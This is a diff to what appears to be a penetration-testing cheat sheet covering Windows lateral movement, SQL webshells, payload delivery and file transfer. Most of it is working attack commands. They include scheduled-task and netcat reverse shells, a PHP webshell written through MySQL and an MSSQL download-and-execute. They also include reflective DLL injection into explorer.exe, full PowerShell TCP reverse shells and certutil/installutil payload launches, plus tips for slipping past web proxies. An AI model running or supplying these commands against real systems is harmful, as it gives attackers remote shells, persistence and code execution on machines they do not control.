@@ -20,8 +20,15 @@ crackmapexec smb --exec-method mmcexec <host> -u <user> -d <domain> -H <hash> -x
 WmiExec.ps1 -ComputerName "<target>" -Command "Get-ChildItem C:\"
 
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash> /run:cmd.exe"'
+Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName <target.fqdn>
 
 wmic /node:"<target>" /user:"<domain\user>" /password:"<pass>" process call create "powershell -Sta -Nop -Window Hidden -EncodedCommand <b64_cmd>"
+
+schtasks /create /S <target.fqdn> /SC Weekly /RU <domain\user> /TN <service_name> /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://<listener_ip>/Invoke-PowerShellTcp.ps1''')'" ; schtasks /Run /S <target.fqdn> /TN <service_name>
+
+Copy-Item .\nc.exe \\<target.fqdn>\C$\Users\Public\Downloads
+schtasks /create /S <target.fqdn> /SC Weekly /RU <domain\user> /TN <service_name> /TR "C:\Users\Public\Downloads\nc.exe -e cmd <listener_ip> <listener_port>" ; schtasks /Run /S <target.fqdn> /TN <service_name>
+
 ```
 
 ### WinRM
@@ -31,15 +38,24 @@ gem install evil-winrm
 evil-winrm -i <target> -u <user> -p '<pass>'
 ```
 
+
 ---
 
 
-## Webshell
+## SQL shell
 
-### Mysql
+### Mysql webshell
 
 ```bash
 SELECT '<?php passthru($_GET[cmd]);?>' INTO OUTFILE '<file_location>/<filename>'
+
+```
+
+### MSSQL reverse shell
+
+```bash
+# https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/lateral_movement/Invoke-SQLOSCmd.ps1
+Invoke-SQLOCmd -Verbose -Command "powershell iex(New-Object Net.WebClient).DownloadString('http://<listener_ip>/Invoke-PowerShellTcp.ps1') -Instance <target.fqdn>
 ```
 
 ---
@@ -66,16 +82,27 @@ tcpdump -ni any host <target>
 
 ```bash
 certutil -urlcache -split -f http://<listener_ip>:1234/shell.exe C:\Windows\Temp\shell.exe & start "" C:\Windows\Temp\shell.exe
+
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U shell.exe
 ```
 
 ### Powershell
 
 ```bash
+# Reflective PE injection
+String cmd = "$bytes = (New-Object System.Net.WebClient).DownloadData('http://<listener_ip>/met.dll');(New-Object System.Net.WebClient).DownloadString('http://<listener_ip>/Invoke-ReflectivePEInjection.ps1') | IEX; $procid = (Get-Process -Name explorer).Id; Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid";
+
+# Basic download and exec
 Invoke-WebRequest -Uri "http://<listener_ip>:1234/nc.exe" -OutFile "nc.exe" & .\nc.exe -e cmd.exe <listener_ip> 1234
+
 echo Invoke-WebRequest -Uri http://<listener_ip>:1234/revshell.exe -Outfile c:\windows\temp\revshell.exe | powershell -noprofile
+
 powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://<listener_ip>:1234/shell.ps1')|iex"
+
 powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("<listener_ip>",1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+
 powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<listener_ip>',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
 powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')
 
 # Powercat
@@ -87,7 +114,8 @@ powercat -c <listener_ip> -p 1234 -e cmd.exe -g > reverse.ps1
 .\reverse.ps1
 
 powercat -c <listener_ip> -p 1234 -e cmd.exe -ge > reverse
-powershell.exe -E -E ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMQBfAFMAZQB0AHUAcAAKAHsACgA.....
+
+powershell -e ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMQBfAFMAZQB0AHUAcAAKAHsACgA.....
 ```
 
 
@@ -218,10 +246,17 @@ reset
 
 ## File transfer 
 
-### Netcat 
+### Bitsadmin
 
 ```bash
+certutil -encode exe.exe file.txt
+bitsadmin /Transfeer jobname http://<listener_ip>/file.txt C:\<path>\file.txt
+certutil -decode file.txt exe.exe
+```
 
+### Netcat
+
+```bash
 nc -nlvp 80 > received.txt
 nc <ip_adress> 80 < sent.txt 
 ```
@@ -253,7 +288,8 @@ python3 -m http.server 8080
 ### SMB impacket
 
 ```bash
-impacket-smbserver -smb2support SHARENAME /tmp/sharename
+impacket-smbserver -smb2support share_name /tmp/sharefolder
+copy \\<listener_ip>\<share_name>\<file>
 ```
 
 ### Powershell
@@ -262,20 +298,16 @@ impacket-smbserver -smb2support SHARENAME /tmp/sharename
 disable UAC
 Set-ExecutionPolicy Unrestricted
 powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"
-Invoke-WebRequest -Uri http://<ip_adress>/x.txt -Outfile c:\Windows\Temp\x.txt
+Invoke-WebRequest -Uri http://<ip_adress>/<file> -Outfile <file>
 ```
 
 ### Powercat
 
 ```bash
-nc -lnvp 443 > x.txt
-powercat -c 10.11.0.4 -p 443 -i C:\Users\Offsec\x.txt```
-```
+nc -lnvp 1234 > <file>
+powercat -c <listener_ip> -p 1234 -i <file>
 
-### SMB impacket
-
-```bash
-impacket-smbserver -smb2support SHARENAME /tmp/sharename
+powercat -l -v -p 443 -t 1000
 ```
 
 ## Metasploit 
@@ -348,3 +380,8 @@ Sub juan()
  CreateObject("Wscript.Shell").Run Str
 End Sub
 ```
+
+## Web proxies
+
+- Use an allowed domain such as cloudfront.net, wordpress.net, azurewebsites.net, etc.
+- check user-agent
